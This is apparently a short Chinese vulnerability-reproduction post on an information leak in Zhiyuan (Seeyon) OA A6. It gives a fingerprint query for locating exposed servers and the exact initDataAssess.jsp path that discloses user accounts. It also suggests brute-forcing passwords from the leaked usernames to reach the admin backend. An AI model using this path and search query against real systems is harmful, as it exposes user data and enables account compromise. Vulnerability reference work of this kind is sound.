---
title: "致远OA A6 initDataAssess.jsp 用户敏感信息泄露"
date: 2026-10-17 09:13:13
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "信息泄露"
  - "漏洞复现"
---
## 洞描述

致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露

可以通过得到的用户名爆破用户密码进入后台进一步攻击

## 漏洞影响

```
致远OA A6
```

## 网络测绘

```
title="致远A8+协同管理软件.A6"
```

## 漏洞复现

访问下列URL泄露用户信息

```
http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-A6-initDataAssess.jsp-%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md)
